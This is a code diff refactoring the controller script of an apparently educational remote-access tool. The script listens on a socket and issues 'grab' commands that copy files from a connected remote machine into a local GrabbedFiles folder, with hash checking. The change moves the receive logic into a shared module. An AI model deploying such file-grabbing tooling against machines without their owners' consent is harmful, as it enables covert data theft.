@@ -8,63 +8,14 @@ import socket
 import hashlib
 from datetime import datetime as dt
 
+from common import receiveFile
+from common import HashMatchError
+
 ip = "0.0.0.0"
 destinationPath = os.path.join(os.path.expanduser('~'), 'GrabbedFiles')
 from common import port
 from common import chunksize
 from common import hashAlgorithm
-
-# https://sqlpey.com/python/top-8-methods-to-hash-files-in-python/
-def getFileHash(filePath):
-    fileHash = hashlib.new(hashAlgorithm)
-    with open(filePath, 'rb') as file:
-        while chunk := file.read(fileHash.block_size):
-            fileHash.update(chunk)
-    return fileHash.hexdigest()
-
-def receiveFile(mySocket, path):
-    try:
-        os.mkdir(destinationPath)
-        print('Created destination folder')
-    except FileExistsError:
-        print('Destination folder exists')
-
-    fileName = os.path.basename(path)
-    destinationFile = os.path.join(destinationPath, fileName)
-    print('Remote File Path =', path)
-    print('Remote File Name =', fileName)
-    print('Destination =', destinationFile)
-
-    print('[+] Downloading file...')
-    with open(destinationFile, 'wb') as file:
-        # walrus operator to loop for as many packets
-        while packet := mySocket.recv(chunksize):
-            #print(packet)
-            if packet.endswith('DONE'.encode()):
-                file.write(packet[:-4])  # Write the last received packet without the word 'DONE'
-                file.flush()
-                print('[+] Transfer completed!')
-
-                print('[+] Calculating file hash...')
-                mySocket.send('READY'.encode())
-                remoteFileHash = mySocket.recv(chunksize).decode()
-                localFileHash = getFileHash(destinationFile)
-                if remoteFileHash == localFileHash:
-                    print('[+] File hashes match!')
-                    print('[+] Success!')
-                else:
-                    print('[-] Warning! File hashes do not match')
-                    print('[-] Remote File Hash:', remoteFileHash)
-                    print('[-] Local File Hash:', localFileHash)
-                break
-            elif 'File not found'.encode() in packet:
-                print ('[-] File not found')
-                break
-            elif 'ERROR'.encode() in packet:
-                error = packet.decode().split('ERROR')[1:]
-                print(error)
-                break
-            file.write(packet)
 
 def doSend(mySocket, sourcePath, destinationPath, fileName):
     # For 'send' operation, open the file in the read mode
@@ -106,8 +57,18 @@ def connect():
         # Command format: grab <File Path>
         # Example: grab C:\Users\user\Desktop\file.txt
         elif 'grab' == commandList[0]:
-            mySocket.send(command.encode())
-            receiveFile(mySocket, path=' '.join(commandList[1:]))
+            try:
+                mySocket.send(command.encode())
+
+                remotePath = ' '.join(commandList[1:])
+                fileName = os.path.basename(remotePath)
+                destinationFile = os.path.join(destinationPath, fileName)
+
+                receiveFile(mySocket, destinationFile)
+            except HashMatchError as e:
+                print(e)
+            except Exception as e:
+                print(e)
 
         #command format: send*<destination path>*<File Name>
         #example: send*C:\Users\John\Desktop\*photo.jpeg
